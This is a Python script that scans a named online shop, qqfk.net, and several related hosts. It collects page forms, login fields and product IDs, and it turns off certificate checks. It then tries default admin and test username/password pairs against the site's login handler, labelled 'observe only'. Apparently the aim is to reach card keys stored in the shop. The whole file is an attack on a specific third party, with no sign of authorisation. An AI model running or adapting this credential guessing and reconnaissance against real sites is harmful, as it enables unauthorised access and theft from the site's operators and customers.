#!/usr/bin/env python3
"""Deepen ASP buy/member/login surface; no YKFAKA/Rainbow."""
import re
import json
import ssl
import urllib.parse
import urllib.request
import urllib.error
import http.cookiejar
from pathlib import Path

OUT = Path("/data/recon/qqfk.net")
UA = "Mozilla/5.0"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
BASE = "https://www.qqfk.net"


def op():
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()),
        urllib.request.HTTPSHandler(context=CTX),
    )


def fetch(o, url, data=None):
    h = {"User-Agent": UA, "Referer": BASE + "/", "Accept": "*/*"}
    if data is not None:
        h["Content-Type"] = "application/x-www-form-urlencoded"
    req = urllib.request.Request(url, data=data, headers=h)
    try:
        r = o.open(req, timeout=20)
        return r.geturl(), getattr(r, "status", 200), r.read()
    except urllib.error.HTTPError as e:
        return url, e.code, e.read()
    except Exception as e:
        return url, None, str(e).encode()


def dec(b):
    for enc in ("utf-8", "gbk"):
        try:
            return b.decode(enc)
        except Exception:
            pass
    return b.decode("utf-8", "ignore")


def main():
    o = op()
    out = {}

    # buy page content
    _, code, body = fetch(o, BASE + "/buy.asp?id=171")
    text = dec(body)
    (OUT / "probe" / "buy_171_www.html").write_text(text, encoding="utf-8")
    print("BUY171", code, len(body))
    print("forms actions", re.findall(r'<form[^>]*action=["\']?([^"\'>\s]+)', text, re.I))
    print("price/stock", re.findall(r"(单价|价格|库存|数量|余额)[^<]{0,40}", text)[:20])
    print("asps", sorted(set(re.findall(r"[\w/]+\.asp[^\"'\s]*", text, re.I)))[:40])

    # kucun
    _, code, body = fetch(o, BASE + "/kucun.asp")
    text = dec(body)
    (OUT / "probe" / "kucun_www.html").write_text(text, encoding="utf-8")
    buys = sorted(set(re.findall(r"buy\.asp\?id=(\d+)", text)))
    print("KUCUN buys", len(buys), buys[:30])
    out["product_ids"] = buys

    # member without login
    _, code, body = fetch(o, BASE + "/member.asp")
    text = dec(body)
    (OUT / "probe" / "member_www.html").write_text(text, encoding="utf-8")
    print("MEMBER", code, len(body), "login?" , "login.asp" in text.lower())
    print("member asps", sorted(set(re.findall(r"[\w/]+\.asp[^\"'\s]*", text, re.I)))[:40])

    # login form
    _, code, body = fetch(o, BASE + "/login.asp")
    text = dec(body)
    (OUT / "probe" / "login_www.html").write_text(text, encoding="utf-8")
    print("LOGIN inputs", re.findall(r'name=["\']([^"\']+)["\']', text, re.I)[:30])
    print("LOGIN action", re.findall(r'<form[^>]*action=["\']?([^"\'>\s]+)', text, re.I))

    # WebLogin / chkuser
    for path in ["/WebLogin.asp", "/WapLogin.asp", "/chkuser.asp"]:
        _, code, body = fetch(o, BASE + path)
        text = dec(body)
        print(path, code, len(body), re.sub(r"\s+", " ", text[:160]))

    # try default creds quickly (common on these shops) — observe only
    for user, pwd in [("admin", "admin"), ("admin", "123456"), ("test", "123456")]:
        _, code, body = fetch(
            o,
            BASE + "/chkuser.asp",
            data=urllib.parse.urlencode({"username": user, "password": pwd, "user": user, "pass": pwd}).encode(),
        )
        text = dec(body)
        print("CHKUSER", user, code, len(body), re.sub(r"\s+", " ", text[:200]))

    # sister hosts ping
    sisters = {}
    for url in [
        "http://ds.yxpf.cc/template/daboapp.php",
        "http://qqlhmd.com/",
        "http://www.qqwxpf.com/",
        "https://yxpf.cc/shop/",
    ]:
        _, code, body = fetch(o, url)
        text = dec(body) if body else ""
        sisters[url] = {
            "code": code,
            "len": len(body or b""),
            "title": (re.search(r"<title>([^<]+)", text) or [None, None])[1],
            "rainbow": "ajax.php" in text or "mod=query" in text,
            "ykfaka": "Query.html" in text or "YKFAKA" in text,
        }
        print("SISTER", url, sisters[url])
    out["sisters"] = sisters
    out["kami_found"] = False
    (OUT / "dump" / "ASP_DEEP.json").write_text(json.dumps(out, ensure_ascii=False, indent=2), encoding="utf-8")
    print("DONE")


if __name__ == "__main__":
    main()
